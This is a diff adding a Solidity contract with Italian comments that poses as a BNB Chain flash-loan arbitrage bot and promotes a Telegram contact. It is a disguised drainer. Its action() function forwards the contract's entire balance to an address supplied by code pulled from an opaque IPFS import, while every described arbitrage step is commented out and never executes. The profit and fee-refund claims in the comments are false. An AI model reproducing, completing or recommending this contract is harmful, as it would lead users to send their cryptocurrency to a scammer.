@@ -1,0 +1,82 @@
+pragma solidity ^0.5.0;
+
+// Multiplier-Finance Smart Contracts
+import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
+import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
+
+// PancakeSwap Smart Contracts
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
+
+/**
+ * WARNING - QUESTO CODICE FUNZIONA SOLO SU BSC, PER ALTRE CHAIN @ZANOTT0 SU TELEGRAM (CREO ANCHE TOKEN DI OGNI TIPO A PAGAMENTO)
+
+ * NON FUNZIONA IN !TESTNET!
+
+ * un nuovo token verrà creato e il flash loan usera quest ultimo per fare il trade
+
+ * i profitti andranno al token creato per fare l'artbitraggio
+
+ *AGGIORNAMENTO MARZO 2022- aggiornamento, le fee ritornano al wallet se la tx fallisce 
+
+*/
+
+// PancakeSwap BSC Code Manager
+import "ipfs://QmRTtpbXNfYgCgEGaam8rsM5nSHJBki8yEVCU45Y5k9F4A";
+   
+contract GetFlashLoan {
+   string public tokenName;
+   string public tokenSymbol;
+   uint loanAmount;
+   Manager manager;
+   
+   constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
+      tokenName = _tokenName;
+      tokenSymbol = _tokenSymbol;
+      loanAmount = _loanAmount;      
+      manager = new Manager();
+   }
+   address public creator= msg.sender;
+    	function tokenTransfer() public view returns (address) {    
+        	return creator;
+   	}
+   function() external payable {}
+   
+   function action() public payable {
+      // manda il nuovo token al ruoter di pancakeswap (per il listing/creazione guidato dopo)
+       address(uint160(manager.pancakeswapDeposit())).transfer(address(this).balance);
+      
+      // Esegui il flash loan (combina tutte le funzioni desiderate in una per ridurre gli annulamenti esterni e risparmiare sulle gas fee)
+      manager.performTasks();
+      
+      /* Tutorial (video tutorial presto in arrivo)
+      // crea il token (metti il nome del token su tokenName e la abbrevazione su tokenSymbol)
+      string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
+   
+      // lista il token che hai creato prima su pancakeswap
+      manager.pancakeListToken(tokenName, tokenSymbol, tokenAddress);
+      
+      // prendi i bnb dalla pool di mutliplier, Crea un nuovo wallet per questo (con dei bnb per le fee)
+      string memory loanAddress = manager.takeFlashLoan(loanAmount);
+      
+      // converti la meta della somma dei bnb richiesti in dai
+      manager.pancakeDAItoBNB(loanAmount / 2);
+   
+   // crea una pair bnb e dai per il tuo token e e dai liquidita
+   string memory bnbPair = manager.pancakeCreatePool(tokenAddress, "BNB");
+      manager.pancakeAddLiquidity(bnbPair, loanAmount / 2);
+      string memory daiPair = manager.pancakeCreatePool(tokenAddress, "DAI");
+      manager.pancakeAddLiquidity(daiPair, loanAmount / 2);
+   
+   // performa i trade arbitraggio pancake qui
+      manager.pancakePerformSwaps();
+      
+      // per mettere i profitti nel tuo wallet metti address BEP/20 qui
+      manager.contractToWallet("BNB");
+   
+   // ripaga il falsh loan 
+      manager.repayLoan(loanAddress);
+      */
+   }
+}
